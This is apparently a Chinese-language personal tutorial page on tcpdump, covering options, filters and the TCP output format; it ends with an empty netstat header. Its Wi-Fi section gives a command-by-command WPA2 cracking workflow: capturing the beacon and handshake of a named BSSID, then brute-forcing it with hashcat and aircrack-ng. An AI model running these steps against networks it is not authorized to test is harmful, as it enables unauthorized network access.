#  Tcpdump 与 netstat
{docsify-updated}

## Tcpdump
tcpdump 是一个很有用的调试工具，可以让超级用户监视网络中的实时流量，实时生成文本信息。对于每个网络报文，tcpdump 都会显示出像时间戳、源 IP 地址、目的 IP 地址以及更多协议特有的细节信息。可以根据协议类型、源和目的 IP 地址、端口号以及其他一些标准来选择需要监视的数据包。

使用语法：
```
tcpdump [ -AbdDefhHIJKlLnNOpqStuUvxX# ] [ -B buffer_size ]
               [ -c count ] [ --count ] [ -C file_size ]
               [ -E spi@ipaddr algo:secret,...  ]
               [ -F file ] [ -G rotate_seconds ] [ -i interface ]
               [ --immediate-mode ] [ -j tstamp_type ] [ -k (metadata_arg) ]
               [ -m module ]
               [ -M secret ] [ --number ] [ --print ]
               [ -Q packet-metadata-filter ] [ -Q in|out|inout ]
               [ -r file ] [ -s snaplen ] [ -T type ] [ --version ]
               [ -V file ] [ -w file ] [ -W filecount ] [ -y datalinktype ]
               [ -z postrotate-command ] [ -Z user ]
               [ --time-stamp-precision=tstamp_precision ]
               [ --micro ] [ --nano ]
               [ expression ]
```

### 常用选项参数
+ `-D`: 列出所有网卡接口，监听时必须指定正确的接口，否则捕获不到流量
+ `-c [count]`: 抓取指定数量的包
+ `-i [interface]`: 指定要抓包的接口,如果-i 后没有加接口，默认抓取所有接口的流量
+ `-I`: 设置为监听模式，只支持IEEE 802.11 Wi-Fi 接口，并且只支持一些操作系统
+ `-w [file]`: 指定将抓包数据写入一个文件而不是打印出来, `tcpdump port 80 -w capture_file`
+ `-U`: 指定缓存，如果设置了-w，那么抓包数据会立即写入文件，没有指定-w，数据会被缓存然后输出
+ `-X`: 以十六进制格式输出
+ `-S`: 抓取整个包
+ `-nn`: 不解析主机名或端口名
+ `-vvv`: 输出更多

### 过滤表达式
+ `host [ip]`: 过滤指定IP的包
+ `src [ip]`: 根据源地址过滤
+ `dst [ip]`: 根据目的地址过滤
+ `port [port]`: 查看指定端口的流量
+ `src port [port]`: 查看指定源端口的流量, `tcpdump port 8050`
+ `dst port [port]`: 查看指定目的端口的流量， `tcpdump src port 8050`
+ `dst port [port]`: 查看指定目的端口的流量， `tcpdump dst port 8050`
+ `tcpdump [protocol]`: 查看指定协议的流量，`tcpdump icmp`


### 输出格式说明
对于每个 TCP 报文，tcpdump 都会按照如下方式显示：

```Shell
src > dst: flags data-seqno ack window urg <options>
```

+ src: 表示源 IP 地址和端口号。
+ dst: 表示目的 IP 地址和端口号。
+ flags: 该字段包含的内容为零个或多个下列字符的组合，每个字符对应于一个 TCP 控制位，61.6.1 节中已描述过，它们是 S(SYN)、F(FIN)、P(PSH)、R(RST)、E(ECE)以及 C(CWR)。
+ data-seqno: 该字段表示这个数据包中的序列号范围。
+ ack: 这是一个形式为“ack num”的字符串，表示连接的另一端所期望的下一个字节 的序列号。
+ window: 这是一个形式为“win num”的字符串，表示在这条连接相反方向上用于传 输的接收缓冲区的空间大小。
+ urg: 这是一个形式为“urg num”的字符串，表示报文段在指定的偏移上包含紧急数据。
+ options: 这个字符串描述了包含在该报文段中的任意 TCP 选项。

其中 src、dst 和 flags 字段总是会显示。其他剩余的字段只在合适的时候才会显示。

### 实战
`sudo tcpdump -i lo0 host localhost and port 9527 --print`


### Wifi Mac 帧
<center><img src="pics/wifi-frame.jpg" width="60%"></center>

软件安装：
+ brew install hashcat
+ brew install hcxtools
+ brew install wireshark

1. export BSSID=18:9e:2c:64:88:3c
2. networksetup -listallhardwareports
3. sudo airport -z
4. sudo airport -c153
5. sudo tcpdump "type mgt subtype beacon and ether src $BSSID" -I -c 1 -i en0 -w beacon.cap
6. sudo tcpdump "ether proto 0x888e and ether host $BSSID" -I -U -vvv -i en0 -w handshake.cap
7. mergecap -a -F pcap -w capture.cap beacon.cap handshake.cap
8. hcxpcapngtool -o hashfile capture.cap
9. hashcat -m 22000 hashfile wpa2-wordlists/full.txt
10. hashcat -m 22000 -a3 capture.hccapx "?d?d?d?d?d?d?d?d"
11. hashcat -m 22000 hashfile wpa.txt -r Probable-Wordlists/Analysis-Files/ProbWL-547-rule-probable-v2.rule

https://hashcat.net/cap2hashcat/

aircrack-ng -1 -a 1 -b 18:9e:2c:64:88:3c 


1. Install aircrack-ng:`brew install aircrack-ng`
2. `sudo airport -s`
3. `sudo airport en1 sniff [CHANNEL]`
4. New Terminal Window: `aircrack-ng -1 -a 1 -b [TARGET_MAC_ADDRESS] [CAP_FILE]`
// Notes: the cap_file will be located in the /tmp/airportSniff*.cap.

## netstat